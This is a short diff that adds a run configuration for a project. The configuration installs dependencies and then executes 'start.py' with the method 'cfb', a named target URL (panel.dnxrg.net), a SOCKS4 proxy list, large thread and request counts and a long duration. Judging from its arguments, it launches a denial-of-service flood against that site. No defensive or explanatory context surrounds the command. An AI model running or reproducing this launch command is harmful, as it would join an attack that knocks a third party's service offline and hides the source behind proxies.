@@ -1,0 +1,2 @@
+language = "bash"
+run = "pip3 install -r requirements.txt && python3 start.py cfb https://panel.dnxrg.net/ 4 100000 socks4.txt 10000 99999"
